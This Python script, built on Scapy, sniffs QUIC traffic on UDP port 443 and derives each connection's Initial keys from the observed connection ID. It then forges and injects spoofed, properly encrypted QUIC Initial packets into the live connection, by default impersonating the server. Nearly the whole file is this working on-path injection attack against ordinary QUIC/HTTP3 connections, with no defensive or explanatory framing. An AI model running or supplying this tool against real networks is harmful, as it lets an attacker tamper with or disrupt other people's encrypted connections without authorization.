from scapy.all import sniff, IP, UDP, Ether, sendp
import operator
from scapy.layers.tls.crypto.hkdf import TLS13_HKDF
from Crypto.Cipher import AES

IFACE = ''

SALT = bytes.fromhex("38762cf7f55934b34d179ae6a4c80cadccbb7f0a")
INJECTION_PAYLOAD = bytes.fromhex("01000000")
INJECTION_PKN = [0,1]
INJECTION_C_TO_S = False

def encode_varint(n):
    if n < 0x40: # 6-bit value
        return bytes([n])
    elif n < 0x4000: # 14-bit value
        return bytes([(n >> 8) & 0x3f | 0x40, n & 0xff])
    elif n < 0x400000: # 22-bit value
        return bytes([(n >> 16) & 0x3f | 0x80, (n >> 8) & 0xff, n & 0xff])
    elif n < 0x40000000: # 30-bit value
        return bytes([(n >> 24) & 0x3f | 0xc0, (n >> 16) & 0xff, (n >> 8) & 0xff, n & 0xff])
    else:
        raise ValueError("Value too large to encode as a QUIC variable-length integer")
    
def parse_varint(data):

    if len(data) < 1:
        raise Exception('too short for varint')
    prefix = data[0] >> 6
    length = 1 << prefix
    if len(data) < length:
        raise Exception('invalid varint')
    v = 0
    for i in range(length):
        if i == 0:
            v = data[0] & 0x3f
        else:
            v = (v << 8) + data[i]
    return length, v
    
def make_quic(original_dcid, original_scid, pn_int, payload, c_to_s):
    
    pn = pn_int.to_bytes((max(pn_int.bit_length(), 1) + 7) // 8, "big")
    pnl = len(pn)
    if pnl < 1 or pnl > 4:
        raise Exception('invalid packet number length')

    token = b''

    tls_hkdf = TLS13_HKDF("sha256")
    pre_initial_secret = tls_hkdf.extract(SALT, original_dcid)

    initial_secret = ''
    if c_to_s:
        initial_secret = tls_hkdf.expand_label(pre_initial_secret, b"client in", b"", 32)
    else:
        initial_secret = tls_hkdf.expand_label(pre_initial_secret, b"server in", b"", 32)
 
    authtag_len = 16

    dcid = ''
    scid = ''
    if c_to_s:
        dcid = original_dcid
        scid = original_scid
    else:
        dcid = original_scid
        scid = original_dcid
 
    first_byte = (bytes.fromhex("c0")[0] | (pnl-1)).to_bytes(1,'big')   # first byte
    header = first_byte + bytes.fromhex("00000001")  # first byte + version
    header += len(dcid).to_bytes(1,'big') + dcid # dcid length + dcid
    header += len(scid).to_bytes(1,'big') + scid # scid length + scid
    header += len(token).to_bytes(1,'big') + token # token length + token
    packet_length = pnl + len(payload) + authtag_len
    packet_length_varint = encode_varint(packet_length)
    header += packet_length_varint
    header += pn # packet number
 
    # encrypt payload
    pp_key = tls_hkdf.expand_label(initial_secret, b"quic key", b"", 16)
    pre_iv = tls_hkdf.expand_label(initial_secret, b"quic iv", b"", 12)
    iv = (int.from_bytes(pre_iv, "big") ^ int.from_bytes(pn, "big")).to_bytes(12, "big")
    payload_encryptor = AES.new(pp_key, AES.MODE_GCM, iv)
    payload_encryptor.update(header)
    ciphertext, auth_tag = payload_encryptor.encrypt_and_digest(payload)
    protected_payload = ciphertext + auth_tag
    sample = (protected_payload)[4-pnl:20-pnl] # https://www.rfc-editor.org/rfc/rfc9001#name-header-protection-sample
 
    # protect header
    hp_key = tls_hkdf.expand_label(initial_secret, b"quic hp", b"", 16)
    header_encryptor = AES.new(hp_key, AES.MODE_ECB)
    mask = header_encryptor.encrypt(sample)
    protected_first_byte = header[0] ^ (mask[0] & 0x0f)
    protected_pn = bytes(map(operator.xor, pn, mask[1:pnl + 1]))
    protected_header = protected_first_byte.to_bytes(1,'big') + header[1:8+len(dcid)+len(scid)+len(token)+len(packet_length_varint)] + protected_pn
 
    # construct packet
    packet = protected_header + protected_payload
 
    # add PADDING frames to required length
    packet +=  b'\x00' * (1200 - len(packet))
 
    return packet

def parse_quic_initial(data):

    if len(data) < 5:
        raise Exception('too short to parse header')
    if data[0] & 0x80 != 0x80:
        raise Exception('not a long header')
    if data[0] & 0x40 != 0x40:
        raise Exception('fixed bit is not 1')
    if data[0] & 0x30 != 0x00:
        raise Exception('long header type != Initial')
    if data[1:5] != b'\x00\x00\x00\x01':
        raise Exception('not version 1')
 
    dcid_len = data[5]
    if len(data) < 6 + dcid_len:
        raise Exception('too short to parse dcid')
    dcid = data[6:6+dcid_len]
 
    scid_len = data[6+dcid_len]
    if len(data) < 7 + dcid_len + scid_len:
        raise Exception('too short to parse scid')
    scid = data[7 + dcid_len:7 + dcid_len + scid_len]
 
    return dcid, scid


def make_udp(smac, dmac, sip, dip, sport, dport):
    ether = Ether(src=smac, dst=dmac)
    ip = IP(src=sip, dst=dip)
    udp = UDP(sport=sport, dport=dport)
    packet = ether / ip / udp
    return packet

def inspect_and_inject(x):

    if not (x.haslayer(IP) and x.haslayer(UDP) and len(x[UDP].load) >= 1200):
        return False
    
    udp_payload = x[UDP].load
    try:
        dcid, scid = parse_quic_initial(udp_payload)
        udp_packet = ''
        if INJECTION_C_TO_S:
            udp_packet = make_udp(x[Ether].src, x[Ether].dst, x[IP].src, x[IP].dst, x[UDP].sport, x[UDP].dport)
        else:
            udp_packet = make_udp(x[Ether].dst, x[Ether].src, x[IP].dst, x[IP].src, x[UDP].dport, x[UDP].sport)

        for pkn in INJECTION_PKN:
            quic_packet = make_quic(dcid, scid, pkn, INJECTION_PAYLOAD, INJECTION_C_TO_S)
            sendp(x=udp_packet / quic_packet, iface=IFACE)
    
        return True
    
    except Exception as e:
        #print(e)
        return False
    
def start_sniffing(iface_str):
    global IFACE
    IFACE = iface_str
    sniff(filter="udp and port 443", iface=iface_str, stop_filter=inspect_and_inject, store=False)

